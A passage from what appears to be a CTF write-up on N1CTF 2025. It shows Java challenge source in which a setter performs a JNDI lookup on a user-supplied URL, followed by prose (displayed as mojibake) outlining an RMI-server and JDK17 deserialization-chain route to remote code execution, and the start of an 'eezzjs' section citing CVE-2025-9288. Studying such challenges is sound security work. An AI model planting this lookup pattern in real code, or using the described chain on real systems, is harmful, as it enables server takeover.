punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonProcessingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">ObjectNode</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLEncoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">RequestDispatcher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>    name <span class="token operator">=</span> <span class="token string">"welcomeServlet"</span><span class="token punctuation">,</span>    value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> welcomeServlet <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_NAME</span> <span class="token operator">=</span> <span class="token string">"guest"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_WORD</span> <span class="token operator">=</span> <span class="token string">"welcome"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ObjectMapper</span> <span class="token constant">OBJECT_MAPPER</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> requestUri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> contextPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> pathWithinApp <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">shouldDelegate</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">delegateToDefaultResource</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> jsonPayload <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> nameParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> wordParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> urlParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>nameParam<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>wordParam<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ObjectNode</span> composed <span class="token operator">=</span> <span class="token constant">OBJECT_MAPPER</span><span class="token punctuation">.</span><span class="token function">createObjectNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> nameParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">,</span> wordParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>urlParam<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> urlParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                jsonPayload <span class="token operator">=</span> composed<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token constant">OBJECT_MAPPER</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> name <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> word <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getWord</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> url <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">renderResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> name<span class="token punctuation">,</span> word<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JsonProcessingException</span> var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    response<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid JSON payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> var15<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    response<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid user data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">shouldDelegate</span><span class="token punctuation">(</span><span class="token class-name">String</span> pathWithinApp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> pathWithinApp <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>pathWithinApp<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">delegateToDefaultResource</span><span class="token punctuation">(</span><span class="token class-name">String</span> pathWithinApp<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">RequestDispatcher</span> defaultDispatcher <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getNamedDispatcher</span><span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>defaultDispatcher <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            defaultDispatcher<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">renderResponse</span><span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> word<span class="token punctuation">,</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;html>&lt;body>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;h1>"</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;p>"</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;p>URL: "</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token class-name">String</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> input <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x27;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> var10000 <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> var10000 <span class="token operator">+</span> <span class="token string">"/?name="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;word="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token string">"welcome"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isBlank</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> value<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">URLEncoder</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æœ‰ä¸€ä¸ª User ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>n1cat</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> word<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getWord</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>word<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setWord</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>word <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>url<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jdk17ï¼Œè€ƒè™‘è°ƒç”¨ setUrl æ‰“é«˜ç‰ˆæœ¬ jndi æ³¨å…¥ï¼Œä½†æ˜¯ jdk17 çš„ jndi æ³¨å…¥ä¸å¤ªå¯èƒ½ï¼Œè€ƒè™‘æ„é€  RMI æ¶æ„æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯</p><p>å¯ä»¥çœ‹åˆ°æœ‰ jackson ä¾èµ–ï¼Œç»§ç»­åˆ©ç”¨æ–‡ä»¶è¯»å–çˆ†ç ´ä¸€ä¸‹ lib ç›®å½•ä¸‹çš„ä¾èµ–ä¸ç‰ˆæœ¬å·ï¼Œå¯ä»¥å‘ç° jackson çš„ç‰ˆæœ¬å·ä¸º 2.19.2ï¼ŒåŒæ—¶å‘ç° spring-aop-5.3.33</p><p>é‚£ä¹ˆå¯ä»¥è€ƒè™‘æ‰“æœ€æ–°æœ€çƒ­çš„ jdk17 åŸç”Ÿé“¾ï¼Œèµ·ä¸€ä¸ª RMI Server ç„¶åè¿”å›è¿™æ¡é“¾å­çš„åºåˆ—åŒ– payload åˆ°å¯¹é¢å®¢æˆ·ç«¯è§¦å‘ååºåˆ—åŒ–å³å¯ RCE</p><p><img src="/blog/2025/11/02/N1CTF-2025/IMG-20251111004829680.png"></p><p><img src="/blog/2025/11/02/N1CTF-2025/IMG-20251111012419019.png"></p><hr><h1 id="eezzjsï¼ˆå¤ç°ï¼‰"><a href="#eezzjsï¼ˆå¤ç°ï¼‰" class="headerlink" title="eezzjsï¼ˆå¤ç°ï¼‰"></a>eezzjsï¼ˆå¤ç°ï¼‰</h1><blockquote><p>CVE-2025-9288</p></blockquote><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"eezzjs"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.9"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.18.2"</span><span class="token punctuation">,</span>    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.5-lts.1"</span><span class="token punctuation">,</span>    <span class="token property">"sha.js"</span><span class="token operator">:</span> <span class="token string">"2.4.10"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"keywords"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sha.js æœ‰ <a 